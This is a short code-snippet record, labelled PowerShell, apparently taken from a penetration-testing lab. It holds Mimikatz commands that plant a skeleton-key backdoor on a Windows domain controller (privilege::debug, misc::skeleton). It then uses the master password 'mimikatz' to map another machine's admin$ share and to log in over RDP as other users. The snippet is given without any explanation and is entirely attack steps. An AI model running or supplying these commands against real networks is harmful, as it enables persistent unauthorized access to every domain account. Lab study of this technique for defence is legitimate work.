---
id: 7aecef2b-9a16-4a8b-a568-87f67c8cddae
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.300971+00:00'
updated_at: '2023-04-10T20:37:18.431742+00:00'
---

# Code Snippet 7aecef2b

**Language**: Powershell

```powershell
privilege::debug
misc::skeleton
# map the share
net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
# login as someone
rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
```
